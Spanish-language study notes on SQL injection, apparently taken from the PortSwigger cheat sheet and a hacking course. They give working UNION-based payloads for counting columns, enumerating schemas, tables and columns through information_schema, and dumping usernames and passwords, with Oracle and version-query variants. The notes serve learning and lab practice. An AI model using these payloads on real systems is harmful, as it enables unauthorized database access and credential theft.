

>https://portswigger.net/web-security/sql-injection/cheat-sheet

#### Como detectarlo
- *Mandando una `'`* -> Busca errores o anomalías que devuelva
- *Condiciones booleanas `OR 1=1`, `OR 1=2`* -> Buscar diferencias o respuestas inusuales
- *Cargas útiles que se basen en tiempo* -> Buscar diferencias en el tiempo de respuesta
- *Cargas útiles de OAST* -> Activa interacciones de red

#### S4vitar

##### En caso de que se nos muestre error en la respuesta

Lo primero que hay que determinar es el numero de columnas que hay para eso usaremos
`' order by X-- -`

>A partir de aquí debemos de poner un valor en donde se hace la petición que no exista

Una vez que sabemos que tenemos una columna tenemos que añadir una nueva fila incorporando un nuevo dato
`' union select 1 -- -` 
Podemos también enumerar el nombre de la base de datos
`' union select database()`

Enumerar todas las demás bases de datos
`' union select group_concat(schema_name) from information_schema.schemata-- -`

Enumerar tablas de una base de datos
`' union select group_concat(table_name) from information_schema.tables where table_schema='hack4u'-- -`

Enumerar las columnas de esa tabla
`' union select group_concat(column_name) from information_schema.columns where table_schema='hack4u' and table_name='users'-- -`

Enumerar el contenido de las columnas
`' union select group_concat(username) from users-- -`

En caso de que quiera enumera una base de datos diferente
`' union select group_concat(username) from Table2.users-- -`

Para concatenar datos de una tabla con `:` como separados en hexadecimal `0x3A`
`' union select group_concat(username,0x3A,password) from users-- -`


##### En caso de que no se nos muestre error
Seguiremos el mismo procedimiento que arriba solo que buscaremos las columnas hasta que muestre algún dato que no se muestre o se muestre o cambie la longitud de la respuesta
`' union select 1-- -`
Si no nos muestra nada probaremos con dos columnas y así sucesivamente
`' union select 1,2-- -`

También podemos probar a hacerlo basado en tiempo, si conocemos al usuario con id 3 por ejemplo podemos hacer que la web tarde en responder 5 segundos
``





























### UNION atack
#### Se debe cumplir:
- *Las columnas individuales deben devolver el mismo numero de columnas* -> Cuantas columnas de devuelven en la columna original??
- *Los tipos de datos deben de ser compatibles entre si* -> Que columnas devueltas en la consulta son un tipo de dato adecuado para la columna dos??

##### Método 1
Una forma de probarlo es haciendo un `' order by 1--` y en la cabecera de la petición interceptada ver donde cambia el numero de caracteres por ejemplo CONTENT-LENGTH

##### Método 2
La segunda forma de detectar el numero de columnas es enviando en la petición valores nulos como por ejemplo `' union select null--`, si el numero de valores nulos no coincide con el numero de columnas de la base de datos se devolverá un error, se usa `NULL` por que los valores entre cada columna deben de ser compatibles con la columna original, ya que `NULL` es convertible a cualquier tipo de dato y es mas posible que se tenga éxito


#### Bases de datos Oracle
En caso de toparnos con una base de datos de Oracle existe una tabla integrada en este llamada `dual`, por ello las consultas del estilo `UNION` deberían ser de la siguiente manera `' union select null from dual--`


##### Determinar que columna contiene caracteres
Para determinar que columna contiene caracteres podemos usar cualquiera de los métodos anteriormente comentado en este caso usando una cadena de texto para ver si puede contener estos `' union select null,'a',null--`

##### Extraer datos
###### Extraer solo una columna
Una vez determinada la cantidad de columnas devueltas por la consulta original y hayamos determinado cual de ellas puede contener datos en la cadena con el método anterior, podemos extraer datos de ellas

###### Extraer múltiples datos
El en caso de Oracle se puede usar el `||`  que se encarga de concatenar cadenas y puedes separarlo por caracteres como por ejemplo `' union select username|| '~'||password from users--`


##### Consultar tipo y versión de la base de datos
###### Diferentes tipos
- Microsoft, MySQL `SELECT @@version`
- Oracle `SELECT * FROM v$version`
- PostgreSQL `SELECT version()`

Para poder ejecutarlo usaríamos el tipo de ataque basado en `UNION` como por ejemplo
`' union select @@version`


##### Listar el contenido de la base de datos
Si lo que queremos es enumerar las tablas de dentro de una base de datos podemos usar `select * from information_schema.tables`
Si encontramos una tabla que nos interesa y queremos enumerar sus columnas usaremos `select * from information_schema.columns where table_name = 'Users'`
